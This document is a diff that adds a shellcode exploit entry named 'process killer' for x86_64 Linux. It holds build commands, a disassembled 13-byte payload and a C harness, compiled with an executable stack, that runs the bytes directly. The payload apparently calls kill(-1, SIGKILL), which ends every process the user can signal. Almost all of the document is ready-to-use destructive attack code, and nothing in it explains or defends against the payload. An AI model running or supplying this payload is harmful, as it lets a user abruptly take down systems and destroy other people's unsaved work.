@@ -1,0 +1,58 @@
+# Exploit Title: process killer
+# Date: 2019-01-29
+# Exploit Author: Aron Mihaljević
+# Tested on: GNU/Linux Mint 19 Cinnamon x86_64
+# Shellcode Length: 13 bytes
+
+
+=====================[COMPILE AND EXECUTE]============================
+nasm -f elf64 killProcess.nasm -o killProcess.o
+
+ld killProcess.o -o killProcess
+
+=========================[DESCRIPTION]================================
+                     62      -1         9        
+
+==========================[SHELLCODE]=================================
+Disassembly of section .text:
+
+0000000000000000 <_start>:
+   0: 48 31 c0              xor    rax,rax
+   3: 04 3e                 add    al,0x3e
+   5: 48 ff cf              dec    rdi
+   8: 6a 09                 push   0x9
+   a: 5e                    pop    rsi
+   b: 0f 05                 syscall 
+
+
+ 
+
+
+==========================[COMPILE C]==================================
+
+gcc -fno-stack-protector -z execstack process_killer.c -o process_killer
+
+
+
+
+#include<stdio.h>
+#include<string.h>
+
+
+
+unsigned char code[] = 
+"\x48\x31\xc0\x04\x3e\x48\xff\xcf\x6a\x09\x5e\x0f\x05";
+ 
+
+
+int main()
+{
+  printf("Shellcode Length:  %d\n", (int) strlen(code));
+
+  int (*ret)() = (int(*)())code;
+
+  ret(0);
+}
+
+
+
